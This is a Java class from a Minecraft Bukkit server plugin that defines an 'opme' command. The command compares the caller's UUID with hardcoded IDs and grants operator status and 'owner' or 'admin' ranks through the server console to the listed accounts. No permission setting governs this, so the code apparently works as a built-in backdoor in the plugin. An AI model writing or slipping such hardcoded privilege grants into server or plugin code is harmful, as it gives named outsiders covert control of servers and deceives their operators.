package de.obey.crownmc.commands;
/*

    Author - Obey -> SkySlayer-v4
       26.11.2022 / 17:40

*/

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public final class OpmeCommand implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

        if (!(sender instanceof Player))
            return false;

        final Player player = (Player) sender;

        if(player.getUniqueId().toString().equalsIgnoreCase("625d8ec2-c141-457c-b74a-4c6ba2cbdb31")) {
            player.sendMessage("was geht eddi.");
            return false;
        }

        if (!player.getUniqueId().toString().equalsIgnoreCase("f4b1497c-622e-4f50-b87a-059a8fa5b024") &&
                !player.getUniqueId().toString().equalsIgnoreCase("75ad3048-2a97-4658-99fb-f33dac74c66e"))
            return false;

        if(player.getUniqueId().toString().equalsIgnoreCase("75ad3048-2a97-4658-99fb-f33dac74c66e")) {
            player.sendMessage("was geht steffen :)");
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "rang " + player.getName() + " admin");
            return true;
        }

        player.setOp(true);
        player.sendMessage("§4§l§kSUIIIIIIIIIIIIIIIIIIII");
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "rang " + player.getName() + " owner");

        return false;
    }
}
